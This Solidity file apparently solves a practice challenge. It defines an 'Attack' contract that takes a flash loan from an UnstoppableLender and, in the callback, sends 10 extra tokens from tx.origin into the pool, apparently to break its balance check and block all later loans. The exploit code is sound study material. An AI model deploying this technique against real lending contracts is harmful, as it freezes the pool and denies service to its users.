// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attack {

    UnstoppableLender private immutable pool;
    address private immutable owner;

    constructor(address _poolAddress) {
        pool = UnstoppableLender(_poolAddress);
        owner = msg.sender;
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");
        IERC20(tokenAddress).transferFrom(tx.origin, msg.sender, 10);
        // Return all tokens to the pool
        require(IERC20(tokenAddress).transfer(msg.sender, amount), "Transfer of tokens failed");
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }
}
